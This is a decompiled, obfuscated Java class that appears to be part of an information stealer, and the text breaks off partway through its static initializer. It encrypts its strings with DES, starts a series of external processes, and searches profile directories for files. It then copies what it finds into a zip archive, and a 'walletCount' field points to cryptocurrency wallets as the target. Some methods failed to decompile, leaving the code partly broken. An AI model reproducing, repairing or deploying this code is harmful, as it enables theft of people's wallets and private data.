/*
 * Decompiled with CFR 0.152.
 */
package a.b.c.j;

import a.b.c.f.u;
import a.b.c.g.s5;
import a.b.c.j.c;
import a.b.c.j.d;
import a.b.c.j.n;
import a.b.c.j.o;
import a.b.c.j.x;
import java.io.File;
import java.io.IOException;
import java.lang.invoke.LambdaMetafactory;
import java.lang.invoke.MethodHandles;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.security.Key;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.function.Consumer;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;

public class w
extends u {
    public static final w INSTANCE;
    public static int walletCount;
    private static final String f;
    private static final String Z;
    private static final Map<String, String> Y;
    private static final Map<String, String> c;
    private static final String[] A;
    private static final String[] t;
    private static final long[] a;
    private static final Integer[] b;
    private static final long S;
    private static final long d;

    @Override
    public void initialize() throws Exception {
    }

    /*
     * Exception decompiling
     */
    public void toOutput(ZipOutputStream var1_1) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [5[DOLOOP]], but top level block is 6[WHILELOOP]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    private void J(long l2) {
        String[] stringArray;
        l2 = d ^ l2;
        String[] stringArray2 = new String[w.a(30747, 7888907866221743146L)];
        stringArray2[0] = w.I(31439, 1883);
        stringArray2[1] = w.I(31451, -18894);
        stringArray2[2] = w.I(31461, 3169);
        stringArray2[3] = w.I(31453, -9945);
        stringArray2[4] = w.I(31465, 9093);
        stringArray2[5] = w.I(31449, -20745);
        stringArray2[w.a((int)11269, (long)89274184508495908L)] = w.I(31484, -9249);
        stringArray2[w.a((int)26761, (long)3808873289006357682L)] = w.I(31487, -14562);
        stringArray2[w.a((int)24328, (long)8871463320044612384L)] = w.I(31486, -31666);
        stringArray2[w.a((int)29938, (long)5257714553414877382L)] = w.I(31473, -18005);
        stringArray2[w.a((int)11674, (long)2891509088555751849L)] = w.I(31436, 188);
        stringArray2[w.a((int)30477, (long)1870300644498080546L)] = w.I(31433, 13049);
        stringArray2[w.a((int)13123, (long)5177353494394292072L)] = w.I(31475, -4668);
        stringArray2[w.a((int)18209, (long)92261972545909523L)] = w.I(31452, -19254);
        stringArray2[w.a((int)20334, (long)1364149519976086355L)] = w.I(31468, 23625);
        stringArray2[w.a((int)12383, (long)8057270731505189992L)] = w.I(31431, -902);
        stringArray2[w.a((int)28234, (long)3282489224430426720L)] = w.I(31474, -9981);
        stringArray2[w.a((int)13809, (long)7142600135291453907L)] = w.I(31454, -4638);
        stringArray2[w.a((int)4958, (long)3857006722284971883L)] = w.I(31485, 28647);
        stringArray2[w.a((int)20761, (long)4124096483385976121L)] = w.I(31481, 12724);
        stringArray2[w.a((int)29768, (long)7948797501659545726L)] = w.I(31424, 6559);
        stringArray2[w.a((int)24391, (long)2647507675926113145L)] = w.I(31435, 10703);
        stringArray2[w.a((int)26885, (long)836686617485614380L)] = w.I(31441, 9226);
        stringArray2[w.a((int)31458, (long)2257048500292456143L)] = w.I(31438, -10837);
        stringArray2[w.a((int)28740, (long)4030294551178511484L)] = w.I(31448, 31798);
        stringArray2[w.a((int)24933, (long)3767889503614113091L)] = w.I(31442, 2527);
        stringArray2[w.a((int)24503, (long)6523474611331083143L)] = w.I(31445, -22165);
        stringArray2[w.a((int)28470, (long)4935360946938911505L)] = w.I(31430, 32008);
        stringArray2[w.a((int)1881, (long)2013547786647434085L)] = w.I(31434, 26456);
        stringArray2[w.a((int)11556, (long)776589064423168285L)] = w.I(31469, 23507);
        stringArray2[w.a((int)13181, (long)7234314536409581400L)] = w.I(31459, 11029);
        stringArray2[w.a((int)25073, (long)2828111797596460509L)] = w.I(31480, 1992);
        stringArray2[w.a((int)16469, (long)6667565888396014705L)] = w.I(31429, -6632);
        stringArray2[w.a((int)20272, (long)920098202529676042L)] = w.I(31456, -8956);
        stringArray2[w.a((int)15413, (long)7794314182679185418L)] = w.I(31462, 19176);
        stringArray2[w.a((int)248, (long)7439736476106454230L)] = w.I(31479, 31159);
        String[] stringArray3 = stringArray = stringArray2;
        int n2 = stringArray3.length;
        boolean bl = o.b();
        u[] uArray = o.Z();
        for (int i2 = 0; i2 < n2; ++i2) {
            String string = stringArray3[i2];
            try {
                ProcessBuilder processBuilder = new ProcessBuilder(w.I(31455, 18891), w.I(31427, 6805), w.I(31470, -8803), string + w.I(31432, 19666));
                processBuilder.redirectOutput(ProcessBuilder.Redirect.to(new File(w.I(31460, 3201))));
                processBuilder.redirectError(ProcessBuilder.Redirect.to(new File(w.I(31463, 7146))));
                processBuilder.start();
                if (bl) return;
                continue;
            }
            catch (Exception exception) {
                // empty catch block
            }
            if (!bl) continue;
        }
        try {
            Thread.sleep(S);
            if (l2 > 0L && uArray == null) return;
        }
        catch (InterruptedException interruptedException) {
            // empty catch block
        }
    }

    private List W(String string, int n2, boolean bl, long l2) {
        ArrayList<String> arrayList;
        block25: {
            boolean bl2;
            boolean bl3;
            block30: {
                int n3;
                u[] uArray;
                block26: {
                    int n4;
                    block27: {
                        File file;
                        block24: {
                            l2 = d ^ l2;
                            arrayList = new ArrayList<String>();
                            File file2 = new File(string);
                            bl3 = o.b();
                            uArray = o.Z();
                            try {
                                try {
                                    file = file2;
                                    if (bl3) break block24;
                                    if (!file.exists()) break block25;
                                }
                                catch (RuntimeException runtimeException) {
                                    throw w.U(runtimeException);
                                }
                                file = new File(string, w.I(31467, 4275));
                            }
                            catch (RuntimeException runtimeException) {
                                throw w.U(runtimeException);
                            }
                        }
                        File file3 = file;
                        try {
                            try {
                                n4 = file3.exists();
                                if (bl3) break block26;
                                if (n4 == 0) break block27;
                            }
                            catch (RuntimeException runtimeException) {
                                throw w.U(runtimeException);
                            }
                            arrayList.add(file3.getAbsolutePath());
                        }
                        catch (RuntimeException runtimeException) {
                            throw w.U(runtimeException);
                        }
                    }
                    n4 = n3 = 1;
                }
                while (n3 <= n2) {
                    boolean bl4;
                    block28: {
                        block29: {
                            block31: {
                                File file = new File(string, w.I(31437, 14082) + n3);
                                try {
                                    try {
                                        try {
                                            try {
                                                bl4 = bl3;
                                                if (uArray == null) break block28;
                                                if (bl4) break block29;
                                            }
                                            catch (RuntimeException runtimeException) {
                                                throw w.b(runtimeException);
                                            }
                                            bl2 = file.exists();
                                            if (bl3) break block30;
                                        }
                                        catch (RuntimeException runtimeException) {
                                            throw w.U(runtimeException);
                                        }
                                        if (!bl2) break block31;
                                    }
                                    catch (RuntimeException runtimeException) {
                                        throw w.U(runtimeException);
                                    }
                                    arrayList.add(file.getAbsolutePath());
                                }
                                catch (RuntimeException runtimeException) {
                                    throw w.U(runtimeException);
                                }
                            }
                            ++n3;
                        }
                        bl4 = bl3;
                    }
                    if (!bl4) continue;
                }
                try {
                    if (l2 < 0L || uArray == null) break block25;
                    bl2 = bl;
                }
                catch (RuntimeException runtimeException) {
                    throw w.b(runtimeException);
                }
            }
            if (bl2) {
                File file = new File(string, w.I(31483, 15835));
                try {
                    boolean bl5;
                    try {
                        bl5 = file.exists();
                        if (bl3 || !bl5) break block25;
                    }
                    catch (RuntimeException runtimeException) {
                        throw w.U(runtimeException);
                    }
                    bl5 = arrayList.add(file.getAbsolutePath());
                }
                catch (RuntimeException runtimeException) {
                    throw w.U(runtimeException);
                }
            }
        }
        return arrayList;
    }

    /*
     * Unable to fully structure code
     */
    private List U(long var1_1, byte var3_2) {
        var4_3 = (var1_1 << 8 | (long)var3_2 << 56 >>> 56) ^ w.d;
        var8_4 = new ArrayList<String>();
        var10_6 = var9_5 = new String[]{w.Z + w.I(31425, 11069), w.Z + w.I(31478, 13756), w.Z + w.I(31458, 12889), w.Z + w.I(31457, -5582), w.Z + w.I(31472, -21492)};
        var7_7 = o.b();
        var6_8 = o.Z();
        var11_9 = var10_6.length;
        var12_10 = 0;
        block38: while (true) {
            v0 = var12_10;
            block39: while (v0 < var11_9) {
                block45: {
                    block46: {
                        block50: {
                            block47: {
                                block48: {
                                    var13_11 = var10_6[var12_10];
                                    var14_12 = new File(var13_11);
                                    try {
                                        try {
                                            try {
                                                try {
                                                    v1 = var7_7;
lbl18:
                                                    // 3 sources

                                                    while (true) {
                                                        if (var6_8 != null) {
                                                            if (v1) break block45;
                                                            v1 = var14_12.exists();
                                                        }
                                                        if (!v1) break block46;
                                                        break;
                                                    }
                                                }
                                                catch (RuntimeException v2) {
                                                    throw w.U(v2);
                                                }
                                                try {
                                                    v3 = var13_11.contains(w.I(31477, 7525));
                                                    if (var6_8 == null) break block47;
                                                    if (var7_7) break block48;
                                                }
                                                catch (RuntimeException v4) {
                                                    throw w.b(v4);
                                                }
                                            }
                                            catch (RuntimeException v5) {
                                                throw w.U(v5);
                                            }
                                            if (!v3) break block50;
                                        }
                                        catch (RuntimeException v6) {
                                            throw w.U(v6);
                                        }
                                        var8_4.add(var13_11);
                                    }
                                    catch (RuntimeException v7) {
                                        throw w.U(v7);
                                    }
                                }
                                v3 = var7_7;
                            }
                            if (!v3) break block46;
                        }
                        var15_13 = var14_12.listFiles();
                        try {
                            v8 = var7_7;
                            if (var6_8 == null) continue block38;
                            try {
                                block57: {
                                    if (v8) break block45;
                                    break block57;
                                    catch (RuntimeException v9) {
                                        throw w.b(v9);
                                    }
                                }
                                if (var15_13 == null) break block46;
                            }
                            catch (RuntimeException v10) {
                                throw w.b(v10);
                            }
                        }
                        catch (RuntimeException v11) {
                            throw w.U(v11);
                        }
                        var16_14 = var15_13;
                        var17_15 = var16_14.length;
                        var18_16 = 0;
                        while (var18_16 < var17_15) {
                            block52: {
                                block53: {
                                    block54: {
                                        var19_17 = var16_14[var18_16];
                                        try {
                                            v12 = var7_7;
                                            if (var6_8 == null) break block52;
                                            try {
                                                block58: {
                                                    if (v12) break block53;
                                                    break block58;
                                                    catch (RuntimeException v13) {
                                                        throw w.b(v13);
                                                    }
                                                }
                                                v0 = (int)var19_17.isDirectory();
                                                if (var7_7) continue block39;
                                                if (var1_1 < 0L) ** GOTO lbl18
                                            }
                                            catch (RuntimeException v14) {
                                                throw w.b(v14);
                                            }
                                            if (var6_8 != null) ** break;
                                            ** continue;
                                        }
                                        catch (RuntimeException v15) {
                                            throw w.U(v15);
                                        }
                                        if (v0 != 0) {
                                            var20_18 = var19_17.getName().toLowerCase();
                                            try {
                                                block55: {
                                                    try {
                                                        try {
                                                            try {
                                                                try {
                                                                    try {
                                                                        v16 = var20_18.endsWith(w.I(31482, 10930));
                                                                        if (var7_7) break block54;
                                                                        if (v16) break block55;
                                                                    }
                                                                    catch (RuntimeException v17) {
                                                                        throw w.U(v17);
                                                                    }
                                                                    v16 = var20_18.endsWith(w.I(31443, 29019));
                                                                    if (var7_7) break block54;
                                                                }
                                                                catch (RuntimeException v18) {
                                                                    throw w.U(v18);
                                                                }
                                                                try {
                                                                    if (var6_8 == null) break block54;
                                                                    if (v16) break block55;
                                                                }
                                                                catch (RuntimeException v19) {
                                                                    throw w.b(v19);
                                                                }
                                                            }
                                                            catch (RuntimeException v20) {
                                                                throw w.U(v20);
                                                            }
                                                            v16 = var20_18.contains(w.I(31476, -27009));
                                                            if (var7_7) break block54;
                                                        }
                                                        catch (RuntimeException v21) {
                                                            throw w.U(v21);
                                                        }
                                                        if (!v16) break block54;
                                                    }
                                                    catch (RuntimeException v22) {
                                                        throw w.U(v22);
                                                    }
                                                }
                                                v16 = var8_4.add(var19_17.getAbsolutePath());
                                            }
                                            catch (RuntimeException v23) {
                                                throw w.U(v23);
                                            }
                                        }
                                    }
                                    ++var18_16;
                                }
                                v12 = var7_7;
                            }
                            if (!v12) continue;
                        }
                    }
                    try {
                        if (var1_1 <= 0L) break block38;
                        if (var3_2 <= 0) {
                            if (var6_8 == null) break block38;
                            ++var12_10;
                        }
                    }
                    catch (RuntimeException v24) {
                        throw w.b(v24);
                    }
                }
                v8 = var7_7;
                if (!v8) continue block38;
            }
            break;
        }
        return var8_4;
    }

    private Map s(long l2) {
        HashMap hashMap;
        block19: {
            Object object7;
            Object object2;
            Object object3;
            Object object42;
            long l4 = l2 = d ^ l2;
            l4 = l4 ^ 0x220461ADF54AL;
            int n2 = (int)(l4 >>> 48);
            int n3 = (int)(l4 << 16 >>> 48);
            int n4 = (int)(l4 << 32 >>> 32);
            long l5 = l3 ^ 0x13A89AE2C752L;
            long l6 = l3 ^ 0x5ADAE1756B46L;
            long l7 = l3 ^ 0x57E8DC73530FL;
            long l8 = l7 >>> 8;
            int n5 = (int)(l7 << 56 >>> 56);
            hashMap = new HashMap();
            boolean bl = o.b();
            n n6 = new n(l5, this);
            u[] uArray = o.Z();
            block10: for (Object object42 : n6.entrySet()) {
                do {
                    boolean bl2;
                    block17: {
                        block16: {
                            object3 = (Map.Entry)object42;
                            object2 = this.W((String)object3.getValue(), 5, true, l6);
                            try {
                                Object object5;
                                try {
                                    object5 = object2;
                                    if (bl) break block16;
                                    try {
                                        bl2 = object5.isEmpty();
                                        if (uArray == null) break block17;
                                        if (bl2) break block16;
                                    }
                                    catch (RuntimeException runtimeException) {
                                        throw w.b(runtimeException);
                                    }
                                }
                                catch (RuntimeException runtimeException) {
                                    throw w.U(runtimeException);
                                }
                                object5 = hashMap.put(object3.getKey(), object2);
                            }
                            catch (RuntimeException runtimeException) {
                                throw w.U(runtimeException);
                            }
                        }
                        bl2 = bl;
                    }
                    if (!bl2) continue block10;
                    object42 = new c(this, (short)n2, (short)n3, n4);
                } while (l2 < 0L || uArray == null);
            }
            Object object6 = object42;
            block12: for (Object object7 : object6.entrySet()) {
                do {
                    object2 = (Map.Entry)object7;
                    File file = new File((String)object2.getValue());
                    boolean bl3 = file.exists();
                    if (uArray != null) {
                        if (bl3) {
                            ArrayList<String> arrayList = new ArrayList<String>();
                            arrayList.add(file.getAbsolutePath());
                            hashMap.put(object2.getKey(), arrayList);
                        }
                        bl3 = bl;
                    }
                    if (!bl3) continue block12;
                    object7 = this.U(l8, (byte)n5);
                } while (l2 < 0L || uArray == null);
            }
            object3 = object7;
            try {
                Object object8;
                try {
                    object8 = object3;
                    if (bl || object8.isEmpty()) break block19;
                }
                catch (RuntimeException runtimeException) {
                    throw w.U(runtimeException);
                }
                object8 = hashMap.put(w.I(31450, 27204), object3);
            }
            catch (RuntimeException runtimeException) {
                throw w.U(runtimeException);
            }
        }
        return hashMap;
    }

    private String G(long l2, String string) {
        String string2;
        block4: {
            String string3;
            block5: {
                l2 = d ^ l2;
                File file = new File(string);
                string3 = file.getName();
                boolean bl = o.b();
                try {
                    try {
                        string2 = string3;
                        if (bl) break block4;
                        if (!string2.isEmpty()) break block5;
                    }
                    catch (RuntimeException runtimeException) {
                        throw w.U(runtimeException);
                    }
                    string2 = w.I(31466, -31143);
                    break block4;
                }
                catch (RuntimeException runtimeException) {
                    throw w.U(runtimeException);
                }
            }
            string2 = string3;
        }
        return string2;
    }

    /*
     * Unable to fully structure code
     */
    private int q(ZipOutputStream var1_1, long var2_2) {
        block21: {
            var4_3 = (var2_2 = w.d ^ var2_2) ^ 133852719179987L;
            var8_4 = 0;
            var7_5 = o.c();
            var6_6 = o.Z();
            for (Map.Entry<String, String> var10_8 : w.c.entrySet()) {
                block22: {
                    var11_9 = var10_8.getKey();
                    var12_10 = var10_8.getValue();
                    var13_11 = new File(w.Z, var12_10);
                    try {
                        v0 = (int)var13_11.exists();
                        if (!var7_5) break block21;
                        if (v0 == 0) break block22;
                    }
                    catch (Exception v1) {
                        throw w.U(v1);
                    }
                    var14_12 = w.I(31464, 26352) + var11_9 + w.I(31471, -11339);
                    try {
                        block23: {
                            block24: {
                                try {
                                    v2 = var13_11.isFile();
                                    if (var6_6 == null) break block23;
                                    try {
                                        block25: {
                                            if (!var7_5) break block23;
                                            break block25;
                                            catch (Exception v3) {
                                                throw w.b(v3);
                                            }
                                        }
                                        if (v2) {
                                            break block24;
                                        }
                                        ** GOTO lbl52
                                    }
                                    catch (Exception v4) {
                                        throw w.b(v4);
                                    }
                                }
                                catch (Exception v5) {
                                    throw w.U(v5);
                                }
                            }
                            var15_13 = new ZipEntry(var14_12 + "/" + var13_11.getName());
                            try {
                                var1_1.putNextEntry(var15_13);
                                Files.copy(var13_11.toPath(), var1_1);
                                var1_1.closeEntry();
                                ++var8_4;
                                v2 = var7_5;
                                if (var6_6 == null) break block23;
                                try {
                                    block26: {
                                        if (v2) break block22;
                                        break block26;
                                        catch (Exception v6) {
                                            throw w.b(v6);
                                        }
                                    }
                                    v2 = var13_11.isDirectory();
                                }
                                catch (Exception v7) {
                                    throw w.b(v7);
                                }
                            }
                            catch (Exception v8) {
                                throw w.U(v8);
                            }
                        }
                        try {
                            if (v2) {
                                this.y(var13_11.toPath(), var14_12, var4_3, var1_1);
                                ++var8_4;
                            }
                        }
                        catch (Exception v9) {
                            throw w.U(v9);
                        }
                    }
                    catch (Exception var15_14) {
                        // empty catch block
                    }
                }
                if (var7_5) continue;
            }
            v0 = var8_4;
        }
        return v0;
    }

    /*
     * Unable to fully structure code
     */
    private void y(Path var1_1, String var2_2, long var3_3, ZipOutputStream var5_4) throws IOException {
        block22: {
            var3_3 = w.d ^ var3_3;
            var8_5 = Files.walk(var1_1, new FileVisitOption[0]);
            var9_6 = null;
            var7_7 = o.b();
            var6_8 = o.Z();
            var8_5.forEach((Consumer<Path>)LambdaMetafactory.metafactory(null, null, null, (Ljava/lang/Object;)V, lambda$copyDirectoryToZip$0(java.nio.file.Path java.lang.String java.util.zip.ZipOutputStream java.nio.file.Path ), (Ljava/nio/file/Path;)V)((Path)var1_1, (String)var2_2, (ZipOutputStream)var5_4));
            if (var8_5 == null) break block22;
            if (var9_6 == null) ** GOTO lbl23
            try {
                var8_5.close();
            }
            catch (Throwable var10_9) {
                try {
                    var9_6.addSuppressed(var10_9);
                    if (var6_8 == null) ** GOTO lbl64
                    try {
                        block25: {
                            if (!var7_7) ** GOTO lbl64
                            break block25;
                            catch (Throwable v0) {
                                throw w.b(v0);
                            }
                        }
                        var8_5.close();
                    }
                    catch (Throwable v1) {
                        throw w.b(v1);
                    }
                }
                catch (Throwable v2) {
                    throw w.U(v2);
                }
            }
            catch (Throwable var10_10) {
                try {
                    var9_6 = var10_10;
                    throw var10_10;
                }
                catch (Throwable var11_11) {
                    block24: {
                        block23: {
                            try {
                                if (var8_5 == null) break block23;
                                if (var9_6 != null) {
                                }
                                ** GOTO lbl56
                            }
                            catch (Throwable v3) {
                                throw w.U(v3);
                            }
                            try {
                                var8_5.close();
                            }
                            catch (Throwable var12_12) {
                                try {
                                    try {
                                        if (var3_3 >= 0L) {
                                            v4 = var9_6;
                                            if (var6_8 == null) break block24;
                                            v4.addSuppressed(var12_12);
                                        }
                                        if (!var7_7) break block23;
                                    }
                                    catch (Throwable v5) {
                                        throw w.b(v5);
                                    }
lbl56:
                                    // 2 sources

                                    var8_5.close();
                                }
                                catch (Throwable v6) {
                                    throw w.U(v6);
                                }
                            }
                        }
                        v4 = var11_11;
                    }
                    throw v4;
                }
            }
        }
    }

    /*
     * Unable to fully structure code
     */
    private static void lambda$copyDirectoryToZip$0(Path var0, String var1_1, ZipOutputStream var2_2, Path var3_3) {
        block14: {
            var4_4 = w.d ^ 102938713055799L;
            var7_5 = o.b();
            var6_6 = o.Z();
            try {
                block12: {
                    block13: {
                        block16: {
                            block15: {
                                var8_7 = var0.relativize(var3_3).toString().replace("\\", "/");
                                var9_9 = var1_1 + "/" + var8_7;
                                try {
                                    if (var6_6 == null) break block12;
                                    v0 = var3_3;
                                    if (var7_5) break block13;
                                }
                                catch (IOException v1) {
                                    throw w.b(v1);
                                }
                                if (!Files.isDirectory(v0, new LinkOption[0])) ** GOTO lbl34
                                break block15;
                                catch (IOException v2) {
                                    throw w.U(v2);
                                }
                            }
                            if (var8_7.isEmpty()) break block14;
                            break block16;
                            catch (IOException v3) {
                                throw w.U(v3);
                            }
                        }
                        try {
                            block17: {
                                var2_2.putNextEntry(new ZipEntry(var9_9 + "/"));
                                var2_2.closeEntry();
                                if (!var7_5) break block14;
                                break block17;
                                catch (IOException v4) {
                                    throw w.U(v4);
                                }
                            }
                            var2_2.putNextEntry(new ZipEntry(var9_9));
                            v0 = var3_3;
                        }
                        catch (IOException v5) {
                            throw w.U(v5);
                        }
                    }
                    Files.copy(v0, var2_2);
                }
                var2_2.closeEntry();
            }
            catch (IOException var8_8) {
                // empty catch block
            }
        }
    }

    static String n() {
        return f;
    }

    static String C() {
        return Z;
    }

    /*
     * Unable to fully structure code
     */
    static {
        block48: {
            block47: {
                block46: {
                    block44: {
                        block45: {
                            block43: {
                                block42: {
                                    block41: {
                                        w.d = s5.a(8788949183797347273L, -5099214919240713320L, MethodHandles.lookup().lookupClass()).a(226415041832881L);
                                        var9 = w.d ^ 108434010058490L;
                                        var1_1 = Cipher.getInstance("DES/CBC/PKCS5Padding");
                                        v0 = SecretKeyFactory.getInstance("DES");
                                        v1 = new byte[8];
                                        v2 = v1;
                                        v1[0] = (byte)(var9 >>> 56);
                                        for (var2_2 = 1; var2_2 < 8; ++var2_2) {
                                            v2 = v2;
                                            v2[var2_2] = (byte)(var9 << var2_2 * 8 >>> 56);
                                        }
                                        var1_1.init(2, (Key)v0.generateSecret(new DESKeySpec(v2)), new IvParameterSpec(new byte[8]));
                                        var0_3 = new String[4];
                                        var6_4 = 0;
                                        var5_5 = "\u00c2\u0005\u00f06 \u00f7\u00b8y\u0018\u00a51\u00a8\u00b6YA\u00c1\u001c\u00aaH\u00bf\u00e9\u0004\u00e9D\u00d4\u00c4<z\u008b7*\u001fB9\u009e\u001c\u0088\u0099Uq\fY\u00f8Q>m`\u0086_\u00d1,\u00c8\u00a3|\"\u00b7|\u00e0\u00dd\u0086%4\u0092\u00aa\u00b6FU\u00a7\"\u00fd\u00a0f\ts\u00bb\u008c/\u00be?\u008ay\u0012DE\u00f3a\u00ebP\u0080\t\u00calL\u00b1\u00a1aI\u00c51bpJ\u0010\u00d0Jc\u00fbs\u0006kw\u008b;\u00c7\u00deH\u00d0$\u00e0\u00a6\u00eds\u008cv\u009b^\u0004\u00bb\u0099@\u00e0\u00e9CU\u0004\u00ceB~'\u00dd=C\u00a8\u0017cP\u00f2\u00191\u007f\u0018\u00e2\u009c\\c\u00c7\u00df\u00c8@\u0087\u00d7._\u0012\u0013+E{\u0006\u007fB)'*|\u001e\u0005z\u00bb\u00e6K\u000eB\u00caL\u00dfS\u00b9A\u001a\u00a6\u00ad\u00c7\u00e5/2\u000e8x\u009c\u008a\u00aa\u0013\u008dU\u0013\u00bf\u00c8):\u0087\u00a9\u00e3\u000bp\u0006+\u00e5\u00fd\u00fb>Y\u00d0\u0080\u00e1z\u0010\u00f94Ii\u0088x\u00b6B\u00edp\u008a\u0004K\u00d3\u00b9\u00cbx\u0015\u00cb\u009f\u001c\u00df+\u0014\u00d9\u00ac\u0018L2\u00bb\u00db\u0096%|\u00c1\u00b1\u0019\u0016\u00bfG\u00dc\u00b6.S\u00ea\u00e9\u008c\u001a\u00c0x\u00eb\u008ai\u001d\u0081\u00c1\u001d\u00b4Cl\u009d\u0095\b\u00f6\u0090\u0089\u0093\u00d3\u00e6a\u0083\u00d2\u0093\u00b4\u0081;\u00e7\u00a1R\u000f\u008f\u00a8\u00d1\u00d0,\u00da\u00f1\n\u00ba\u00fa$\u00d6\u009d\u00f4)\u00aa\u00bbvf\n\u0000\u000f\u00a0PN\u00ee\u00a5Y\u00a6\u0080v\u00a7\u00d7\u0017[\u00805\u0085U\u0096\u00e4\u00ddQ(\u0018\u0018;{\u0019\u00fe\u0086\u0080\u00f8\u00f0\u0013\u00d6\u0090T\u000e\u0097\b\u00ab*\u00e0\u00f4*\u00f2\u00d0_\u008a";
                                        var7_6 = "\u00c2\u0005\u00f06 \u00f7\u00b8y\u0018\u00a51\u00a8\u00b6YA\u00c1\u001c\u00aaH\u00bf\u00e9\u0004\u00e9D\u00d4\u00c4<z\u008b7*\u001fB9\u009e\u001c\u0088\u0099Uq\fY\u00f8Q>m`\u0086_\u00d1,\u00c8\u00a3|\"\u00b7|\u00e0\u00dd\u0086%4\u0092\u00aa\u00b6FU\u00a7\"\u00fd\u00a0f\ts\u00bb\u008c/\u00be?\u008ay\u0012DE\u00f3a\u00ebP\u0080\t\u00calL\u00b1\u00a1aI\u00c51bpJ\u0010\u00d0Jc\u00fbs\u0006kw\u008b;\u00c7\u00deH\u00d0$\u00e0\u00a6\u00eds\u008cv\u009b^\u0004\u00bb\u0099@\u00e0\u00e9CU\u0004\u00ceB~'\u00dd=C\u00a8\u0017cP\u00f2\u00191\u007f\u0018\u00e2\u009c\\c\u00c7\u00df\u00c8@\u0087\u00d7._\u0012\u0013+E{\u0006\u007fB)'*|\u001e\u0005z\u00bb\u00e6K\u000eB\u00caL\u00dfS\u00b9A\u001a\u00a6\u00ad\u00c7\u00e5/2\u000e8x\u009c\u008a\u00aa\u0013\u008dU\u0013\u00bf\u00c8):\u0087\u00a9\u00e3\u000bp\u0006+\u00e5\u00fd\u00fb>Y\u00d0\u0080\u00e1z\u0010\u00f94Ii\u0088x\u00b6B\u00edp\u008a\u0004K\u00d3\u00b9\u00cbx\u0015\u00cb\u009f\u001c\u00df+\u0014\u00d9\u00ac\u0018L2\u00bb\u00db\u0096%|\u00c1\u00b1\u0019\u0016\u00bfG\u00dc\u00b6.S\u00ea\u00e9\u008c\u001a\u00c0x\u00eb\u008ai\u001d\u0081\u00c1\u001d\u00b4Cl\u009d\u0095\b\u00f6\u0090\u0089\u0093\u00d3\u00e6a\u0083\u00d2\u0093\u00b4\u0081;\u00e7\u00a1R\u000f\u008f\u00a8\u00d1\u00d0,\u00da\u00f1\n\u00ba\u00fa$\u00d6\u009d\u00f4)\u00aa\u00bbvf\n\u0000\u000f\u00a0PN\u00ee\u00a5Y\u00a6\u0080v\u00a7\u00d7\u0017[\u00805\u0085U\u0096\u00e4\u00ddQ(\u0018\u0018;{\u0019\u00fe\u0086\u0080\u00f8\u00f0\u0013\u00d6\u0090T\u000e\u0097\b\u00ab*\u00e0\u00f4*\u00f2\u00d0_\u008a".length();
                                        var4_7 = 352;
                                        var3_8 = -1;
lbl19:
                                        // 2 sources

                                        while (true) {
                                            v3 = ++var3_8;
                                            v4 = var5_5.substring(v3, v3 + var4_7);
                                            v5 = -1;
                                            break block41;
                                            break;
                                        }
lbl24:
                                        // 1 sources

                                        while (true) {
                                            var0_3[var6_4++] = w.b(var8_9).intern();
                                            if ((var3_8 += var4_7) < var7_6) {
                                                var4_7 = var5_5.charAt(var3_8);
                                                ** continue;
                                            }
